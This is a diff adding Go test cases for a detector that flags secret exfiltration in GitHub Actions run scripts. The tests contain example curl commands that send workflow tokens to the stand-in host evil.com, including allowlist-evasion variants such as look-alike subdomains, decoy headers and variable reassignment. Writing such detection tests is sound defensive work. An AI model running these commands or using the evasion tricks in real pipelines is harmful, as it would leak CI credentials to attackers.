@@ -59,6 +59,18 @@ func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
 			description: "Should detect curl with secret in header",
 		},
 		{
+			name:        "curl with attached -H value containing secret",
+			runScript:   `curl -H"Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrors:  1,
+			description: "Should detect curl with secret in attached -H header value",
+		},
+		{
+			name:        "curl with attached -d value containing secret",
+			runScript:   `curl -d"token=${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrors:  1,
+			description: "Should detect curl with secret in attached -d data value",
+		},
+		{
 			name:        "curl POST to github api (legitimate)",
 			runScript:   `curl -X POST https://api.github.com/repos/owner/repo/issues -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"`,
 			wantErrors:  0,
@@ -837,6 +849,74 @@ func TestSecretExfiltration_CurlToKnownGoodDomains(t *testing.T) {
 	}
 }
 
+func TestSecretExfiltration_AllowlistRequiresDestinationHostBoundary(t *testing.T) {
+	tests := []struct {
+		name      string
+		runScript string
+		wantErrs  int
+	}{
+		{
+			name:      "allowlisted host in header does not suppress malicious destination",
+			runScript: `curl -H "Referer: https://api.github.com" -d "token=${{ secrets.TOKEN }}" https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "allowlisted host suffix is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "untrusted second destination prevents allowlist suppression",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://api.github.com https://evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory in untrusted path does not allowlist",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/artifactory`,
+			wantErrs:  1,
+		},
+		{
+			name:      "hashicorp in untrusted path does not allowlist",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil.com/hashicorp`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory product host is not implicitly allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.example.com/api`,
+			wantErrs:  1,
+		},
+		{
+			name:      "artifactory attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://artifactory.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "nexus in attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://evil-nexus.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "vault attacker-controlled host is not allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://vault.evil.com`,
+			wantErrs:  1,
+		},
+		{
+			name:      "explicit hashicorp domain remains allowlisted",
+			runScript: `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://releases.hashicorp.com/vault/`,
+			wantErrs:  0,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			errors := runSecretExfiltrationRuleForTest(tt.runScript, nil)
+			if len(errors) != tt.wantErrs {
+				t.Fatalf("%s: got %d errors, want %d. Errors: %v", tt.name, len(errors), tt.wantErrs, errors)
+			}
+		})
+	}
+}
+
 func TestSecretExfiltration_EdgeCases(t *testing.T) {
 	tests := []struct {
 		name        string
@@ -892,6 +972,23 @@ func TestSecretExfiltration_EdgeCases(t *testing.T) {
 					tt.description, gotErrors, tt.wantErrors, rule.Errors())
 			}
 		})
+	}
+}
+
+func TestSecretExfiltration_PositionAfterEarlierGitHubExpression(t *testing.T) {
+	runScript := `echo '${{ github.repository }}' && curl -d 'token=${{ secrets.API_TOKEN }}' https://evil.com`
+
+	errors := runSecretExfiltrationRuleForTest(runScript, nil)
+	if len(errors) != 1 {
+		t.Fatalf("got %d errors, want 1. Errors: %v", len(errors), errors)
+	}
+
+	curlCol := strings.Index(runScript, "curl") + 1
+	if errors[0].LineNumber != 1 {
+		t.Fatalf("LineNumber = %d, want 1. Error: %v", errors[0].LineNumber, errors[0])
+	}
+	if errors[0].ColNumber < curlCol {
+		t.Fatalf("ColNumber = %d, want at or after curl column %d. Error: %v", errors[0].ColNumber, curlCol, errors[0])
 	}
 }
 
@@ -1082,6 +1179,14 @@ curl -X POST -H "Authorization: token $GITHUB_TOKEN" --data-binary @file "$uploa
 			runScript:  `curl -H "Authorization: token $GITHUB_TOKEN" "https://evil.com/exfil"`,
 			wantErrors: 1,
 			desc:       "Should flag curl sending env-var secret to non-legit destination",
+		},
+		{
+			name: "later safe assignment does not allowlist earlier malicious call",
+			runScript: `api_url="https://evil.com/exfil"
+curl -H "Authorization: token $GITHUB_TOKEN" "$api_url"
+api_url="https://api.github.com/repos/owner/repo"`,
+			wantErrors: 1,
+			desc:       "Should flag when URL variable was malicious at call time even if reassigned later",
 		},
 	}
 
